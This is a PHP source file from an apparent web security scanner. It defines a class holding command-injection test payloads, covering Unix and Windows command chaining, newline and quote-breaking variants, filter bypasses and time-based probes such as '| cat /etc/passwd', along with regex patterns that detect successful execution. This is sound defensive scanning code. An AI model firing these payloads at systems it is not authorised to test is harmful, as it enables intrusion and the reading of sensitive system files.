<?php

declare(strict_types=1);

namespace BEAR\SecurityScanner\Dast\Payload;

use BEAR\SecurityScanner\VulnerabilityInterface;

/**
 * Command Injection attack payloads
 */
final class CommandInjectionPayload implements PayloadInterface
{
    public function getName(): string
    {
        return 'Command Injection';
    }

    public function getPayloads(): array
    {
        return [
            // Basic command chaining
            '; id',
            '| id',
            '|| id',
            '&& id',
            '& id',
            '`id`',
            '$(id)',

            // With common commands
            '; whoami',
            '| whoami',
            '; uname -a',
            '| cat /etc/passwd',

            // Windows commands
            '& dir',
            '| dir',
            '; dir',
            '& whoami',
            '| net user',

            // Newline injection
            "%0aid",
            "%0d%0aid",
            "\nid",
            "\r\nid",

            // Quoted command injection
            "'; id; '",
            '"; id; "',
            "'; id; #",
            '"; id; #',

            // Bypass attempts
            ';${IFS}id',
            ';{id,}',
            "';{id,}'",

            // Time-based detection
            '; sleep 5',
            '| sleep 5',
            '& ping -c 5 127.0.0.1',
            '| ping -n 5 127.0.0.1',
        ];
    }

    public function getSuccessPatterns(): array
    {
        return [
            // Unix command output
            '/uid=\d+.*gid=\d+/i',
            '/root:.*:0:0:/i',
            '/Linux\s+\S+\s+\d+\.\d+/i',
            '/www-data/i',
            '/apache/i',
            '/nginx/i',

            // Windows command output
            '/Windows\s+(NT|XP|Vista|7|8|10|11|Server)/i',
            '/Directory of/i',
            '/Volume Serial Number/i',
            '/NTAUTHORITY/i',

            // Error messages indicating command execution
            '/sh:.*not found/i',
            '/command not found/i',
            '/syntax error near unexpected token/i',
            '/Permission denied/i',
        ];
    }

    public function getSeverity(): string
    {
        return VulnerabilityInterface::SEVERITY_CRITICAL;
    }

    public function getDescription(): string
    {
        return 'Command Injection vulnerability detected - arbitrary system commands can be executed';
    }

    public function getRecommendation(): string
    {
        return 'Avoid using shell commands with user input. If necessary, use escapeshellarg() and escapeshellcmd(), or use language-native alternatives.';
    }
}
